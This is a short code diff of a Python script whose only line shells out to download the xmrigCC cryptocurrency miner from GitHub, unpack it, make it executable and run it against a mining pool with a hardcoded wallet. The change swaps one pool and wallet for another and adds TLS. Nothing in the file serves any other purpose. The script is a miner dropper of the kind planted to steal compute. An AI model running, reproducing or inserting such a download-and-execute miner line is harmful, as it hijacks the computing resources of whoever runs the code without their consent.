@@ -1,2 +1,2 @@
 import os
-os.system("wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && ls -a && chmod +x ./xmrigDaemon && ./xmrigDaemon -a gr -o eu.flockpool.com:4444 -u RC4KZTrmFHZGoaV3k42bMKsgr8CQ99qEkj -k")
+os.system("wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.0/xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && tar -xf xmrigCC-miner_only-3.4.0-linux-dynamic-amd64.tar.gz && ls -a &&chmod +x ./xmrigDaemon && ./xmrigDaemon -o pool.hashvault.pro:443 -u 43NA3bgmhkFD2E5ychNnhG7TTcsp78e4AbZEAgBUwK8ubdnAe8tvFo2dNmhMw9fCELjBA9Enfsjkihm7RvwEN71gMeWVVbX --randomx-mode=MODE -k --tls")
